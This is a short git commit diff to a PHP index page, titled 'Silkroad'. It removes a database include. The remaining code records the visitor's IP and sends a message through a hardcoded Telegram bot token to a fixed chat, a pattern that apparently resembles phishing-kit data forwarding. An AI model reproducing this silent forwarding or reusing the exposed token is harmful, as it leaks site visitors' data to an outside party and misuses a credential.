e3002ba137a8c68a977d85da7f8d6334ec0818c2
Xavier Orejarena <xavierorejarena@Xavier-MacBook-Pro.local>
2021-09-09 14:52:16 -0400

    Silkroad

--- index.php
+++ index.php
@@ -1,5 +1,4 @@
-<?php  
-include "connect.php";
+<?php
 $IP = $_SERVER['REMOTE_ADDR'];
 $token = '16396100:AAG_6y_pnkgYCKNRMyFVHow2eefR719DfCk';
 file_get_contents("https://api.telegram.org/bot7$token/sendMessage?chat_id=149273661&text=$text"); 
